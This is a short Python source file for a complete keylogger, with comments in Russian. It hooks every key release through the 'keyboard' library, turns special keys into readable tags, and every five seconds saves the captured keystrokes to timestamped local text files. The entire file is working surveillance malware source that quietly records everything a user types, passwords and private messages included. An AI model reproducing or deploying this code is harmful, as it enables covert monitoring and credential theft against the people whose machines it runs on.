import keyboard
from threading import Timer
from datetime import datetime

SEND_REPORT_EVERY = 5


class Keylogger:
    def __init__(self, interval):
        self.interval = interval
        self.log = ""
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def callback(self, event):
        name = event.name

        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                # Заменим пробелы спец клавиш символами подчеркивания
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        # Добавим имя ключа в лог
        self.log += name

    def update_filename(self):
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

    def report_to_file(self):
        with open(f"{self.filename}.txt", "w") as f:
            print(self.log, file=f)

        print(f"Сохранение {self.filename}.txt")

    def report(self):
        if self.log:
            self.end_dt = datetime.now()

            self.update_filename()
            self.report_to_file()
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True

        timer.start()

    def start(self):
        # Записать дату и время начала
        self.start_dt = datetime.now()

        keyboard.on_release(callback=self.callback)
        self.report()
        keyboard.wait()


if __name__ == "__main__":
    # Запустим кейлоггер
    Keylogger(interval=SEND_REPORT_EVERY).start()